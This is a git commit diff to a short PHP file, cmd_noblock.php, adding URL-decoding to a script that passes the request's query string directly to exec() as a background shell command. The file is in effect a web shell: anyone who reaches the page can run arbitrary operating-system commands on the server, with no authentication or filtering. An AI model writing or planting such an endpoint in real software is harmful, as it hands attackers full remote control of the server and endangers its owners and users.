49f38eefdd2f951bae7e21606c6d3d93411d548b
laiyuantemp <100673133+laiyuantemp@users.noreply.github.com>
2022-08-16 14:00:55 +0800

    Update cmd_noblock.php

--- cmd_noblock.php
+++ cmd_noblock.php
@@ -1,5 +1,6 @@
 <?php
   $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "?", 1)+1);
+  $cmd = urldecode($cmd);
   exec($cmd." >log.txt 2>&1 &");
 ?>
 <form action="/cmd_noblock.php">
